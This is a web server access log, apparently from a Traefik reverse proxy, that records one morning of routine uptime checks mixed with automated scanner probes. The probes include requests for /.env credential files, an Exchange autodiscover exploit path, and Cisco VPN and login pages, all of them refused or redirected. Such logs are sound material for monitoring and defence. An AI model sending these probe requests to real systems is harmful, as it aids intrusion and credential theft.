159.203.109.206 - - [15/Dec/2023:08:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 225 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 226 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 227 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 228 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:08:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 229 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 230 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 231 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 232 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 233 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:15:32 +0000] "GET /index.html HTTP/1.1" 404 19 "-" "-" 234 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:08:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 235 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 236 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 237 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 238 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 239 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 240 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 241 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:08:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 242 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 243 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 244 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 245 "www@docker" "http://172.28.0.10:80" 1ms
148.153.56.82 - - [15/Dec/2023:08:20:53 +0000] "GET /BxLV HTTP/1.1" 404 19 "-" "-" 246 "-" "-" 0ms
148.153.56.82 - - [15/Dec/2023:08:20:54 +0000] "GET /RKKu HTTP/1.1" 404 19 "-" "-" 247 "-" "-" 0ms
148.153.56.82 - - [15/Dec/2023:08:20:54 +0000] "GET /aab8 HTTP/1.1" 404 19 "-" "-" 248 "-" "-" 0ms
148.153.56.82 - - [15/Dec/2023:08:20:55 +0000] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 19 "-" "-" 249 "-" "-" 0ms
148.153.56.82 - - [15/Dec/2023:08:20:56 +0000] "GET /aab9 HTTP/1.1" 404 19 "-" "-" 250 "-" "-" 0ms
148.153.56.82 - - [15/Dec/2023:08:20:56 +0000] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 19 "-" "-" 251 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 252 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 253 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:08:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 254 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 255 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:22:43 +0000] "GET /index.html HTTP/1.1" 404 19 "-" "-" 256 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 257 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 258 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 259 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 260 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 261 "www@docker" "http://172.28.0.10:80" 1ms
57.129.23.166 - - [15/Dec/2023:08:25:25 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 262 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:08:25:25 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 263 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [15/Dec/2023:08:25:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 264 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:08:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 265 "www@docker" "http://172.28.0.10:80" 1ms
198.199.115.119 - - [15/Dec/2023:08:25:44 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 266 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 267 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 268 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:26:42 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 19 "-" "-" 269 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 270 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:08:27:27 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 271 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:08:27:28 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 272 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:08:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 273 "www@docker" "http://172.28.0.10:80" 1ms
192.241.223.55 - - [15/Dec/2023:08:27:51 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 274 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 275 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 276 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 277 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 278 "www@docker" "http://172.28.0.10:80" 1ms
167.94.145.54 - - [15/Dec/2023:08:30:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 279 "web-to-websecure@internal" "-" 0ms
167.94.145.54 - - [15/Dec/2023:08:30:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 280 "web-to-websecure@internal" "-" 0ms
167.94.145.54 - - [15/Dec/2023:08:30:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 281 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 282 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 283 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 284 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 285 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:08:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 286 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 287 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:33:00 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 19 "-" "-" 288 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 289 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 290 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 291 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 292 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 293 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 294 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 295 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 296 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:36:45 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 19 "-" "-" 297 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 298 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:08:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 299 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 300 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 301 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 302 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 303 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 304 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 305 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 306 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 307 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 308 "www@docker" "http://172.28.0.10:80" 0ms
35.178.157.24 - - [15/Dec/2023:08:42:33 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 19 "-" "-" 309 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:08:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 310 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 311 "www@docker" "http://172.28.0.10:80" 1ms
54.37.79.75 - - [15/Dec/2023:08:43:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 312 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:08:43:29 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 313 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:08:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 314 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 315 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 316 "www@docker" "http://172.28.0.10:80" 1ms
139.162.196.113 - - [15/Dec/2023:08:45:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 317 "web-to-websecure@internal" "-" 0ms
139.162.196.113 - - [15/Dec/2023:08:45:21 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 318 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 319 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 320 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:46:02 +0000] "GET /logon.htm HTTP/1.1" 404 19 "-" "-" 321 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 322 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 323 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 324 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 325 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 326 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 327 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:08:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 328 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 329 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 330 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 331 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:08:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 332 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 333 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:52:14 +0000] "GET /logon.htm HTTP/1.1" 404 19 "-" "-" 334 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 335 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 336 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 337 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:08:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 338 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:08:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 339 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 340 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 341 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 342 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:55:55 +0000] "GET /login.jsp HTTP/1.1" 404 19 "-" "-" 343 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 344 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 345 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 346 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 347 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 348 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 349 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 350 "www@docker" "http://172.28.0.10:80" 1ms
34.140.130.61 - - [15/Dec/2023:08:59:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 351 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:08:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 352 "www@docker" "http://172.28.0.10:80" 1ms
185.224.128.191 - - [15/Dec/2023:09:00:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 353 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 354 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:09:00:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 355 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:09:00:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 356 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:09:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 357 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 358 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 359 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:09:02:16 +0000] "GET /login.jsp HTTP/1.1" 404 19 "-" "-" 360 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 361 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 362 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 363 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 364 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 365 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 366 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:09:04:54 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 367 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 368 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 369 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:09:05:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 370 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 371 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 372 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 373 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 374 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 375 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 376 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 377 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 378 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:09:09:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 379 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 380 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 381 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 382 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 383 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 384 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 385 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 386 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 387 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 388 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 389 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 390 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 391 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 392 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 393 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 394 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 395 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 396 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 397 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 398 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 399 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 400 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 401 "www@docker" "http://172.28.0.10:80" 1ms
45.79.168.172 - - [15/Dec/2023:09:20:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 402 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 403 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 404 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 405 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 406 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 407 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 408 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 409 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 410 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 411 "www@docker" "http://172.28.0.10:80" 1ms
